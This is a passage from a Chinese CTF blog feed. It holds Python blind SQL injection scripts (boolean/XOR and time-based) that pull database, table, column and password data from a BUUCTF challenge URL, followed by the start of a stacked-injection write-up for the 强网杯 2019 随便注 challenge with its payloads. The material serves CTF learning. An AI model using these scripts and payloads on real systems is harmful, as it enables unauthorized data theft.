传参的脚本&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;修改 url 和 文本&lt;/p&gt;
&lt;h2 id=&#34;21-基于异或盲注布尔盲注等&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#21-基于异或盲注布尔盲注等&#34;&gt;#&lt;/a&gt; 2.1 基于异或盲注，布尔盲注等：&lt;/h2&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; requests&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;url &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;http://d98fb290-369c-4ad8-8cd5-883846041dad.node4.buuoj.cn/search.php?id=&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token builtin&#34;&gt;min&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;32&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token builtin&#34;&gt;max&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;128&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;min&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        mid &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;min&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;1^(ascii(substr(database(),&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;,1))&gt;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;mid&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;)#&#34;&lt;/span&gt;&lt;/span&gt;       &lt;span class=&#34;token comment&#34;&gt;#查库名&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;#payload=f&#34;1^(ascii (substr ((select (group_concat (table_name)) from (information_schema.tables) where (table_schema)=&#39;geek&#39;),&amp;#123;i&amp;#125;,1))&gt;&amp;#123;mid&amp;#125;)#&#34;        #查表名&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;#payload=f&#34;1^(ascii (substr ((select (group_concat (column_name)) from (information_schema.columns) where (table_name)=&#39;F1naI1y&#39;),&amp;#123;i&amp;#125;,1))&gt;&amp;#123;mid&amp;#125;)#&#34;      #查列名&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;#payload=f&#34;1^(ascii (substr ((select (group_concat (password)) from (F1naI1y)),&amp;#123;i&amp;#125;,1))&gt;&amp;#123;mid&amp;#125;)#&#34;       #查数据&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        response&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;url&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;ERROR&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; response&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token builtin&#34;&gt;min&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; mid &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token builtin&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;mid&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;min&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;32&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        name &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;min&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;22-基于时间盲注&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#22-基于时间盲注&#34;&gt;#&lt;/a&gt; 2.2 基于时间盲注：&lt;/h2&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; requests&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; time &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;url &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;http://d98fb290-369c-4ad8-8cd5-883846041dad.node4.buuoj.cn/search.php?id=&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token builtin&#34;&gt;min&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;32&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token builtin&#34;&gt;max&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;128&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;min&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        mid &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;min&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34; &#34;&lt;/span&gt;&lt;/span&gt;       &lt;span class=&#34;token comment&#34;&gt;#查库名&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;#payload=f&#34; &#34;        #查表名&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;#payload=f&#34; &#34;      #查列名&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;#payload=f&#34; &#34;       #查数据&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        last &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        response&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;url&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        now &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; now &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; last &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token builtin&#34;&gt;min&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; mid &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token builtin&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;mid&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;min&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;32&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        name &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;min&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;3备注&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3备注&#34;&gt;#&lt;/a&gt; 3. 备注&lt;/h1&gt;
&lt;p&gt;1.payload 不放了，这个做题慢慢积累，网上也都有，根据题目自己写&lt;/p&gt;
&lt;p&gt;2. 能不使用 sleep 就不使用，速度比其他的方法慢太多&lt;/p&gt;
&lt;p&gt;3. 在网不好的情况下可能会出现脚本打印的字符错误，不是代码问题&lt;/p&gt;
&lt;p&gt;4. 自己写的脚本可能不完善，有问题或者有建议留言，有需求也可以自改&lt;/p&gt;
&lt;p&gt;5. 遇到新的脚本或者方法再补充&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;END&lt;/p&gt;
</content>
        <category term="sql" />
        <updated>2021-08-17T13:51:59.954Z</updated>
    </entry>
    <entry>
        <id>http://imfanqie.top/2021/08/01/ctf/web/sql/(ctfwp)sql%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%8F%8A%E9%A2%84%E7%BC%96%E8%AF%91%E7%9A%84%E5%AD%A6%E4%B9%A0/</id>
        <title>(ctfwp)sql堆叠注入及预编译的学习</title>
        <link rel="alternate" href="http://imfanqie.top/2021/08/01/ctf/web/sql/(ctfwp)sql%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%8F%8A%E9%A2%84%E7%BC%96%E8%AF%91%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
        <content type="html">&lt;p&gt;很久没有碰 sql 注入了，最近几天复习了一下，顺便掌握了点新的知识。&lt;/p&gt;
&lt;p&gt;好多题的 wp 我都懒得写了，挑一两道写吧&lt;/p&gt;
&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;先推一下两篇很有帮助的文章，以后自己复习用&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5L2FydGljbGUvZGV0YWlscy8xMDMyMzkxNDU/dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3JlbGV2YW50Lm5vbmUtdGFzay1ibG9nLTIlN0VkZWZhdWx0JTdFQmxvZ0NvbW1lbmRGcm9tTWFjaGluZUxlYXJuUGFpMiU3RWRlZmF1bHQtMS5jb250cm9sJmFtcDtkZXB0aF8xLXV0bV9zb3VyY2U9ZGlzdHJpYnV0ZS5wY19yZWxldmFudC5ub25lLXRhc2stYmxvZy0yJTdFZGVmYXVsdCU3RUJsb2dDb21tZW5kRnJvbU1hY2hpbmVMZWFyblBhaTIlN0VkZWZhdWx0LTEuY29udHJvbA==&#34;&gt;[强网杯 2019] 随便注 的三种解法&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDI3NDgyL2FydGljbGUvZGV0YWlscy8xMDk4OTg5MzQ=&#34;&gt;MySQL 之 handler 的详细使用及说明&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;1强网杯-2019随便注&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1强网杯-2019随便注&#34;&gt;#&lt;/a&gt; 1.[强网杯 2019] 随便注&lt;/h2&gt;
&lt;p&gt;1. 先试试万能密码  &lt;code&gt;1‘ or 1=1 #&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;有回显，这说明可以注入：&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDEvbU85NExhNkJjWHlRQWplLnBuZw==&#34;&gt;https://i.loli.net/2021/08/01/mO94La6BcXyQAje.png&lt;/span&gt;&amp;quot; alt=&amp;quot;1.1.png&amp;quot; style=&amp;quot;zoom:50%;&amp;quot; /&amp;gt;&amp;lt;!--p1--&amp;gt;&lt;/p&gt;
&lt;p&gt;做个 FUZZ 测试，不放图了，发现 select 等关键词都被 ban 了，无法联合，只能少量报错注入。&lt;/p&gt;
&lt;p&gt;因此考虑堆叠注入。&lt;/p&gt;
&lt;p&gt;查库名：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;1&#39;; show databases;#  
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDEvTUZJNGJxUXV3SkxTR1hOLnBuZw==&#34;&gt;https://i.loli.net/2021/08/01/MFI4bqQuwJLSGXN.png&lt;/span&gt;&amp;quot; alt=&amp;quot;1.2.png&amp;quot; style=&amp;quot;zoom:50%;&amp;quot; /&amp;gt;&amp;lt;!--p2--&amp;gt;&lt;/p&gt;
&lt;p&gt;查表名:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;1&#39;; show tables;#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDEvdTVlelgxR0Nadk1ZeG9RLnBuZw==&#34;&gt;https://i.loli.net/2021/08/01/u5ezX1GCZvMYxoQ.png&lt;/span&gt;&amp;quot; alt=&amp;quot;1.3.png&amp;quot; style=&amp;quot;zoom:50%;&amp;quot; /&amp;gt;&amp;lt;!--p3--&amp;gt;&lt;/p&gt;
&lt;p&gt;显然 flag 应该在长的那串数字里，查列名:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt; 1&#39;; show columns from `1919810931114514`;#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDEvUVhod1BsQTRCazFheUdWLnBuZw==&#34;&gt;https://i.loli.net/2021/08/01/QXhwPlA4Bk1ayGV.png&lt;/span&gt;&amp;quot; alt=&amp;quot;1.4.png&amp;quot; style=&amp;quot;zoom:50%;&amp;quot; /&amp;gt;&amp;lt;!--p4--&amp;gt;&lt;/p&gt;
